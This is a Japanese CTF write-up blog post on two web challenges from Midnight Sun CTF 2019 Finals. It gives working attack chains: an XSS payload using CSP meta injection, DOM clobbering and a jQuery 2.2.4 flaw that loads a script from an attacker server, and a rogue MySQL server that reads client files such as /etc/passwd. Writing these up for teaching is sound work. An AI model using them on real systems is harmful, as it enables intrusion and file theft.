---
layout: post
title: Midnight Sun CTF 2019 Finals に参加しました
categories: [ctf]
date: 2019-06-21 03:30:00 +0900
---

6 月 15 日から 6 月 16 日にかけて開催された [Midnight Sun CTF 2019 Finals](https://midnightsunctf.se/competition.html) に、チーム dcua として参加しました。最終的にチームで 8617 点を獲得し、順位は得点 14 チーム中 8 位でした。うち、私は 2 問を解いて 1896 点を入れました。

他のメンバーの writeup はこちら。

- [Midnight Sun CTF 2019 Finals参加記 - CTFするぞ](https://ptr-yudai.hatenablog.com/entry/2019/06/17/054006)

以下、私が解いた問題の writeup です。

## [Web 893] marcololo (8 solves)
> How slow is your metabolism?  
> Service: http://marcololo-01.play.midnightsunctf.se:3001

与えられた URL にアクセスすると、`/marcololo` へのリンクと URL を送信できるフォームが表示されました。ユーザ操作なしに `/marcololo` 下で `alert(1)` を実行させることができればフラグが得られるようです。`/marcololo?input=(here)` にアクセスすると、以下のような HTML が返されました。

```html
<head>
    <meta charset="UTF-8">
    <link rel="stylesheet" href="/static/style.css" />
    <meta property="og:title" content="(here)">
    <script src="https://code.jquery.com/jquery-2.2.4.min.js"></script>
    <script src="/api/getuser"></script>
</head>

<script>

if(user.name == "admin"){
  $.get(location.hash.slice(1));
}else{
  document.write("u are not admin, fak off");
}

</script>
```

OGP のページタイトルの部分にユーザ入力が挿入されるようです。ASCII で印字可能な文字をすべて突っ込んでみると、以下の文字が使えることがわかりました。

```
0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&'()*+,-./:;=?@[\]^_`{|}~ 
```

`<` や `>` は使えないものの、`"` は使えるようです。これなら `meta` 要素に属性を追加するような形の XSS ができそうです。

まず `user.name == "admin"` を `true` にするにはどうすればよいか考えてみましょう。`user` は以下のように `/api/getuser` で定義されています。

```javascript
user = {"id":"-1", "name": "guest", "type": "guest"}
```

`<script src="/api/getuser"></script>` は XSS 可能な箇所より後ろにあるので、もし `meta` 要素を使って `user.name` を `admin` に書き換えることができても、上書きされてしまいます。

これを防ぐために `/api/getuser` を読み込ませないようにする必要がありますが、そのひとつの方法として Content Security Policy (CSP) によるブロックが考えられます。CSP は HTTP レスポンスヘッダ以外でも `meta` 要素の `http-equiv` 属性を使えば指定でき、例えば `<meta http-equiv="Content-Security-Policy" content="script-src 'none'">` ですべてのスクリプトの実行をブロックさせることができます。

今回は jQuery と `if(user.name == "admin"){…}` の 2 つだけを実行できるようにしたいので、スクリプトのハッシュと `code.jquery.com` というドメイン名を `script-src` ディレクティブで許可しましょう。

`/marcololo?input=script-src%20%27sha256-bYN4krH0C61TIckMTVqjkOb3aCxs8G8sezFnSlL9G4E=%27%20https://code.jquery.com%22%20http-equiv=%22Content-Security-Policy` で以下のように `/api/getuser` の読み込みだけをブロックできる HTML を出力させることができました。

```html
<head>
    <meta charset="UTF-8">
    <link rel="stylesheet" href="/static/style.css" />
    <meta property="og:title" content="script-src 'sha256-bYN4krH0C61TIckMTVqjkOb3aCxs8G8sezFnSlL9G4E=' https://code.jquery.com" http-equiv="Content-Security-Policy">
    <script src="https://code.jquery.com/jquery-2.2.4.min.js"></script>
    <script src="/api/getuser"></script>
</head>

<script>

if(user.name == "admin"){
  $.get(location.hash.slice(1));
}else{
  document.write("u are not admin, fak off");
}

</script>
```

これで `user` は `undefined` になりましたが、どうすれば `user.name` を `admin` にすることができるのでしょう。このように未初期化のグローバル変数が参照されているシチュエーションでは [DOM Clobbering](https://diary.shift-js.info/dom-clobbering/) と呼ばれる手法が利用できます。これは `<meta id="test">` のような要素が存在しており、かつ `test` という変数が未初期化の場合には、`test` というグローバル変数に `document.getElementById('test')` で得られるものと同じオブジェクトが格納されているという手法です。

また、すべての要素は [`Element`](https://developer.mozilla.org/ja/docs/Web/API/Element) を継承しており、`Element` は [`name`](https://developer.mozilla.org/ja/docs/Web/API/Element/name) というプロパティを参照することでその要素の `name` 属性の値を参照することができるので、例えば `<meta id="user" name="neko">` という要素が存在している場合には `user.name` は `'neko'` という文字列を返すはずです。

これらを組み合わせて、`/marcololo?input=script-src%20%27sha256-bYN4krH0C61TIckMTVqjkOb3aCxs8G8sezFnSlL9G4E=%27%20https://code.jquery.com%22%20id=%22user%22%20name=%22admin%22%20http-equiv=%22Content-Security-Policy` で以下のように `if(user.name == "admin"){…}` を `true` にさせることができました。

```html
<head>
    <meta charset="UTF-8">
    <link rel="stylesheet" href="/static/style.css" />
    <meta property="og:title" content="script-src 'sha256-bYN4krH0C61TIckMTVqjkOb3aCxs8G8sezFnSlL9G4E=' https://code.jquery.com" id="user" name="admin" http-equiv="Content-Security-Policy">
    <script src="https://code.jquery.com/jquery-2.2.4.min.js"></script>
    <script src="/api/getuser"></script>
</head>

<script>

if(user.name == "admin"){
  $.get(location.hash.slice(1));
}else{
  document.write("u are not admin, fak off");
}

</script>
```

さて、`alert(1)` を実行させればフラグが得られますが、`$.get` だけでどうやって `alert` を呼び出せばよいのでしょう。`$.get` は jQuery で定義されている関数ですが、読み込まれている jQuery のバージョンを見ると、どうやら 2.2.4 と [2016 年にリリース](https://blog.jquery.com/2016/05/20/jquery-1-12-4-and-2-2-4-released/)された大変古いものを利用していることがわかります。このバージョンの jQuery に脆弱性がないか `jquery 2.2.4 vulnerabilities` でググってみると、[CVE-2015-9251](https://nvd.nist.gov/vuln/detail/CVE-2015-9251) という Ajax 周りのそれっぽい脆弱性が見つかりました。

これは `dataType` を指定せずにクロスドメインの Ajax リクエストを送った場合、返ってきたレスポンスの `Content-Type` が `text/javascript` であればその内容を実行してしまうという脆弱性のようです。やってみましょう。

以下のような PHP スクリプトを `neko.php` というファイル名で書き込みます。

```php
<?php
header('Access-Control-Allow-Origin: *');
header('Content-Type: text/javascript');
?>
alert(1);
```

適当なサーバでホストし、`/marcololo?input=script-src%20%27sha256-bYN4krH0C61TIckMTVqjkOb3aCxs8G8sezFnSlL9G4E=%27%20%27unsafe-eval%27%20https://code.jquery.com"%20id="user"%20name="admin"%20http-equiv="Content-Security-Policy#http://(攻撃者のサーバ)/neko.php` にアクセスすると `alert(1)` を実行することができました。この URL を管理者に投げるとフラグが得られました。

```
midnight{@lw4yz_cl0b_b3f0re_34t1ng_c0rn_0n_th3_c0b}
```

## [Web 1003] icanhazfile (6 solves)
> I forgot my login to this health care system. The swedish cough is the worst...  
> Service: http://icanhazfile-01.play.midnightsunctf.se:3002/

与えられた URL にアクセスすると、`/login` に遷移し以下のようなログインフォームが表示されました。

```html
<!DOCTYPE html>
<html lang="en">
  <head>
      <title>AUTHENTICATE</title>
      <meta charset="UTF-8">
      <meta name="viewport" user-scalable="no" content="width=device-width, initial-scale=1">
      <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
      <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
      <link rel="stylesheet" href="https://netdna.bootstrapcdn.com/bootstrap/3.3.2/css/bootstrap.min.css" />
      <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/mdbootstrap/4.3.0/css/mdb.min.css" />
      <link href="https://fonts.googleapis.com/css?family=VT323&display=swap" rel="stylesheet">
      <link rel="stylesheet" href="/img/style.css" />
  </head>
  <body><section class="login-info">
<div class="container">
  <div class="row main">
    <div class="main-content elegant-color-dark">
          <form method="POST" action="/login">
          <div class="input-group" style="width: 100% !important; font-size: 130%; /*css aint nobody got time fo dat*/">
            <input id="user" type="text" class="form-control text-center" autocomplete="off" name="username" placeholder="USERNAME">
          </div>
          <div class="input-group" style="width: 100% !important; font-size: 130%; /*css aint nobody got time fo dat*/">
            <input id="pass" autocomplete="off" type="text" class="form-control text-center pw" name="password" placeholder="PASSWORD">
          </div>
          
          <div class="form-group">
              <input style="font-size: 130% !important;" type="submit" value="AUTHENTICATE" name="login" class="btn elegant-color btn-lg btn-block login-button"/>
          </div>


            

          </form>
          
          <div class="form-group" id="container">
          </div>
      
      </div>
    </div></body>
<!-- background credits (not part of chall): http://www.thetadivision.com/ -->
    </html>
```

いろいろな入力を試すことで、以下のような挙動をすることがわかりました。

- SQLi ではなさそう (`'` や `"` を入力しても普通のアルファベット等を入力したときと同じ挙動)
- NoSQL Injection や PHP の type confusion でもなさそう (`username[]=test` や `password[$ne]=test` でユーザ名が入力されていない旨のエラー)
- `admin` というユーザ名が存在しそう (ユーザ名に `admin` を入力するとパスワードが違うと表示され、`test` を入力するとユーザが存在しないと表示される)
- ユーザ名は case-sensitive (ユーザ名に `ADMIN` を入力するとユーザが存在しないと表示される)
- マルチバイト文字を入力すると 500 Internal Server Error が返ってくるが、悪用はできなさそう

怪しげな挙動はいくつかありますが、いずれも悪用できそうにありません。

ログインフォーム以外でなにかできないか探っていると、問題サーバの IP アドレスである `52.208.15.104` に直接アクセスした際に不思議な挙動をしました。HTML 等は通常と同じようなものを返しますが、ログインフォームを送信した際に以下のようなエラーメッセージを返しました。

```
/app/app.py: could not connect to database
```

Python が使われており、またログイン時にはデータベースに接続しようとしていることが推測できます。

なぜ IP アドレスを直接指定するとこのようなエラーが発生するのでしょうか。原因を探っていると、`Host` ヘッダがデータベースの接続先に関わっていることがわかりました。[ettic-team/dnsbin](https://github.com/ettic-team/dnsbin) を使って `curl http://52.208.15.104:3002/login -H "Host: (ドメイン名)" -d "username=admin&password=password"` を実行してみると、`database.(ドメイン名)` の名前解決の試みが観測できました。

もし名前解決ができたらどのような挙動をするのでしょうか。`Host: (IP アドレス).nip.io` を試して、`ufw.log` でどのポートに接続しようとしているか確認しましょう。

```
st98@ubuntu-s-1vcpu-1gb-sgp1-01:/var/log$ sudo tail -n 50 ufw.log | grep 52.208
Jun 15 21:56:33 ubuntu-s-1vcpu-1gb-sgp1-01 kernel: [1265782.031021] [UFW BLOCK] IN=eth0 OUT= MAC=5e:7d:14:4a:2f:a4:84:c1:c1:81:09:30:08:00 SRC=52.208.15.104 DST=xxx.xxx.xxx.xxx LEN=60 TOS=0x00 PREC=0x00 TTL=41 ID=21263 DF PROTO=TCP SPT=49214 DPT=3306 WINDOW=29200 RES=0x00 SYN URGP=0 
Jun 15 21:57:31 ubuntu-s-1vcpu-1gb-sgp1-01 kernel: [1265840.588812] [UFW BLOCK] IN=eth0 OUT= MAC=5e:7d:14:4a:2f:a4:84:c1:c1:81:09:30:08:00 SRC=52.208.15.104 DST=xxx.xxx.xxx.xxx LEN=60 TOS=0x00 PREC=0x00 TTL=41 ID=37064 DF PROTO=TCP SPT=49220 DPT=3306 WINDOW=29200 RES=0x00 SYN URGP=0 
```

3306 番ポートへの接続を試みています。3306 番ポートは MySQL がデフォルトで使用するポート番号です。サーバを立ち上げて `52.208.15.104` のみが接続できるようにし、再度 `Host: (IP アドレス).nip.io` を試して MySQL のエラーログを見てみましょう。

```
2019-06-15T22:17:09.107095Z 13 [Note] Access denied for user 'root'@'ec2-52-208-15-104.eu-west-1.compute.amazonaws.com' (using password: YES)
```

root でのログインを試みています。`/etc/my.cnf` に `skip-grant-tables` を加えてパスワード入力なしで root にログインできるようにし、`tcpdump -s0 -i eth0 -X dst port 3306 or src port 3306` でパケットをキャプチャすると、以下のように発行されているクエリの情報が得られました。

```
22:32:16.659918 IP ec2-52-208-15-104.eu-west-1.compute.amazonaws.com.49402 > ubuntu-s-1vcpu-1gb-sgp1-01.mysql: Flags [P.], seq 224:297, ack 179, win 229, options [nop,nop,TS val 3851398856 ecr 1114519952], length 73
        0x0000:  4500 007d ef00 4000 2906 0249 34d0 0f68  E..}..@.)..I4..h
        0x0010:  xxxx xxxx c0fa 0cea ec88 7609 0276 261a  ..........v..v&.
        0x0020:  8018 00e5 5c9d 0000 0101 080a e58f aec8  ....\...........
        0x0030:  426e 3990 4500 0000 0353 454c 4543 5420  Bn9.E....SELECT.
        0x0040:  2263 6361 6267 6173 776f 6b22 2041 5320  "ccabgaswok".AS.
        0x0050:  6e6f 6e63 652c 206e 616d 652c 2070 6173  nonce,.name,.pas
        0x0060:  7377 6f72 6420 6672 6f6d 2066 6c61 672e  sword.from.flag.
        0x0070:  7573 6572 7320 6c69 6d69 7420 31         users.limit.1
```

`SELECT "ccabgaswok" AS nonce, name, password from flag.users limit 1` と、`flag.users` というテーブルからパスワード等を取得しています。また、`nonce` として与えられている文字列は接続ごとに異なっています。とりあえず `name` と `password` というカラムを持つ `flag.users` というテーブルを作ってみましょう。

```
mysql> create database flag;
Query OK, 1 row affected (0.00 sec)

mysql> use flag;
Database changed
mysql> create table users (name text, password text);
Query OK, 0 rows affected (0.01 sec)
```

ここでしばらく詰まりました。`name` に `admin`、`password` に `password` を入れてみたり、Query Rewrite Plugin 等を使って、`password` が与えられた `nonce` 等をもとにした SHA-1 ハッシュ等を返すようにしたりしてみましたが、どれもうまくいかず問題サーバはパスワードが間違っているというメッセージを返しました。

しばらくググっていると、[VolgaCTF 2018 Quals で出題された Corp monitoring という問題の writeup](https://github.com/balsn/ctf_writeup/tree/master/20180324-volgactf#corp-monitoring-unsolved-written-by-bookgin-special-thanks-to-admin-aleksey) を見つけました。この問題と同様に MySQL のクライアントが接続してくるようなシチュエーションで、[`LOCAL DATA INFILE` を使ってクライアント側のファイルを読み出しています](http://russiansecurity.expert/2016/04/20/mysql-connect-file-read/)。

writeup で紹介されているコードをそのまま実行し、`curl http://52.208.15.104:3002/login -H "Host: (IP アドレス).nip.io" -d "username=admin&password=password"` を実行してみると、以下のように `/etc/passwd` を読み出すことができました。

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
_apt:x:104:65534::/nonexistent:/bin/false
```

`/app/app.py` にソースコードがあることは先程のエラーメッセージからわかっています。以下のような変更を加え、読み出してみましょう。

```diff
$ diff orig.py mod.py
18,19c18,20
< dump_etc_passwd = bytes.fromhex('0c000001fb2f6574632f706173737764')
< server.send(dump_etc_passwd)
---
> path = '/app/app.py'
> payload = chr(len(path) + 1) + unhex('000001fb') + path
> server.send(payload)
```

以下のようにソースコードが得られました。

```python
#! usr/bin/python
# -*- coding: utf-8 -*-

from flask import Flask, render_template, request, redirect, send_from_directory
import config
import os
import subprocess
import random
import string
import hashlib
import binascii

# Initialization of variables and modules
app = Flask(__name__)
app.config.from_object('config')

## ROUTES

@app.route('/img/<path:path>')
def send_js(path):
    return send_from_directory('img', path)

@app.route('/')
@app.route('/index')
def index():
    return redirect('/login')

@app.route('/login', methods=['GET','POST'])
def login():
    form = request.form
    if request.method == 'GET':
        return render_template('security/login.html', form=form)
    else:
        name = request.form.get('username')
        password = request.form.get('password')

        if name:
            name = name[0:200].strip()
        else:
            return render_template("security/login.html", error="Name is required!")


        if password:
            password = password[0:200].strip()
        else:
            return render_template("security/login.html", error="Password is required!")

        try:
            host = request.headers.get('Host').split(":")[0]
            res = database("database."+host)
        except:
            res = False
            pass

        if res:
            if 'name' in res and 'password' in res:
                if not name == res['name']:
                    return render_template("security/login.html", error="User does not exist!")
                if binascii.hexlify(hashlib.pbkdf2_hmac('sha256', password, 'PJSalt', 137)) == res['password'].lower():
                    return render_template("security/flag.html", error=os.getenv('FLAG'))
                else:
                    return render_template("security/login.html", error="Wrong password!")
        else:
            return render_template("security/login.html", error="/app/app.py: could not connect to database")

def shellquote(s):
    # This is not a cmd injection chall. But if you succeed, plz dont break the chall.
    return "'" + s.replace("'", "'\\''") + "'"

def database(host):
    host = shellquote(host)
    password = os.getenv('MYSQL_ROOT_PASSWORD')
    nonce = ''.join(random.choice(string.ascii_lowercase) for i in range(10))
    cmd = "timeout 1 mysql -uroot -p"+password+" -h"+host+" -e 'SELECT \""+nonce+"\" AS nonce, name, password from flag.users limit 1'"
    process = subprocess.Popen([cmd], stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    err, out = process.communicate()
    cols = []
    res = {}
    for line in err.strip().split("\n"):
        if len(cols) == 0:
            for item in line.split("\t"):
                cols.append(item.strip())
        else:
            for item in line.split("\t"):
                res[cols.pop(0)] = item.strip()

    if res['nonce'] == nonce:
        return res
    else:
        return False


@app.after_request
def after_request(response):
    response.headers.add('X-Content-Type-Options', 'nosniff')
    response.headers.add('X-Frame-Options', 'deny')
    response.headers.add('Server', 'Apache')
    return response

## RUN APP
if __name__ == "__main__":
    app.run(host=config.HOST, port=config.PORT, debug=False, threaded=True)
```

ログイン部分のロジックを抜き出します。

```python
if 'name' in res and 'password' in res:
    if not name == res['name']:
        return render_template("security/login.html", error="User does not exist!")
    if binascii.hexlify(hashlib.pbkdf2_hmac('sha256', password, 'PJSalt', 137)) == res['password'].lower():
        return render_template("security/flag.html", error=os.getenv('FLAG'))
    else:
        return render_template("security/login.html", error="Wrong password!")
```

`hashlib.pbkdf2_hmac('sha256', (ログインフォームで入力したパスワード), 'PJSalt', 137)` と MySQL サーバが返した `password` が一致していればフラグが表示されるようです。

`binascii.hexlify(hashlib.pbkdf2_hmac('sha256', b'password', b'PJSalt', 137))` の結果を以下のように `flag.users` に挿入します。

```
mysql> insert into users values ('admin', '0c1b8b04e8367e14574f1766cc1b7b85cf03e3df82b37cd9854409e00af457d6');
Query OK, 1 row affected (0.01 sec)
```

`curl http://52.208.15.104:3002/login -H "Host: (IP アドレス).nip.io" -d "username=admin&password=password"` でフラグが得られました。

```
midnight{et_tu_mySqL?}
```

## 感想とか
- SL アクセスカード (SL のトラムやバス等で共通して使える Suica 的なカード) + 72 時間の乗り放題チケットを買っておくとストックホルム内の移動が楽でした。
- 3 食と飲み物、仮眠できる場所等が用意された会場 (スウェーデン王立工科大学) で 24 時間競技をしていました。問題に集中できる環境でよかったです。
- writeup を書いた 2 問 + ptr-yudai さんが解いた heavensdoor の他に smallspin という Web 問があったのですが、こちらも解きたかったです。くやしい。
- 競技終了後にしばらくホテルで休憩してから観光に行きました。時間の都合上、ガムラスタンと数箇所しか回れませんでしたが楽しかったです。今後もし機会があれば、もう少しゆっくり観光したいですね。